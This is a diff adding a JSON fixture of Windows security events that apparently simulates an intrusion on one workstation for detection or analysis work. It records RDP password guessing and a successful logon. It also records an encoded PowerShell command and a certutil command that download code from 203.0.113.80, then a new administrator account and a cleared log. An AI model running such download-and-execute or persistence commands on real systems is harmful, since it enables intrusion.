@@ -1,0 +1,219 @@
+[
+ {
+  "TimeCreated": "2026-11-06T00:15:00Z",
+  "Id": 4624,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "jlee",
+   "IpAddress": "192.0.2.31",
+   "LogonType": "3"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T01:02:00Z",
+  "Id": 4624,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "mpatel",
+   "IpAddress": "192.0.2.31",
+   "LogonType": "3"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T03:30:00Z",
+  "Id": 4624,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "jlee",
+   "IpAddress": "192.0.2.31",
+   "LogonType": "3"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:01:00Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "Administrator",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:01:11Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "admin",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:01:22Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "helpdesk",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:01:36Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "Administrator",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:01:44Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "helpdesk",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:01:57Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "backup",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:02:11Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "helpdesk",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:02:22Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "scanner",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:02:30Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "helpdesk",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:02:43Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "helpdesk",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:02:56Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "user1",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:03:06Z",
+  "Id": 4625,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "helpdesk",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:05:02Z",
+  "Id": 4624,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "helpdesk",
+   "IpAddress": "203.0.113.80",
+   "LogonType": "10"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:09:00Z",
+  "Id": 4688,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "SubjectUserName": "helpdesk",
+   "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwBhAC4AcABzADEAJwApAA=="
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:10:30Z",
+  "Id": 4688,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "SubjectUserName": "helpdesk",
+   "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
+   "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.80/p.exe C:\\Users\\Public\\p.exe"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:12:00Z",
+  "Id": 4720,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "SubjectUserName": "helpdesk",
+   "TargetUserName": "svc-backup"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:12:20Z",
+  "Id": 4732,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "SubjectUserName": "helpdesk",
+   "TargetUserName": "Administrators",
+   "MemberName": "svc-backup"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T04:20:00Z",
+  "Id": 1102,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "SubjectUserName": "helpdesk"
+  }
+ },
+ {
+  "TimeCreated": "2026-11-06T05:45:00Z",
+  "Id": 4624,
+  "Computer": "WS-07.corp.example.com",
+  "Data": {
+   "TargetUserName": "mpatel",
+   "IpAddress": "192.0.2.31",
+   "LogonType": "3"
+  }
+ }
+]
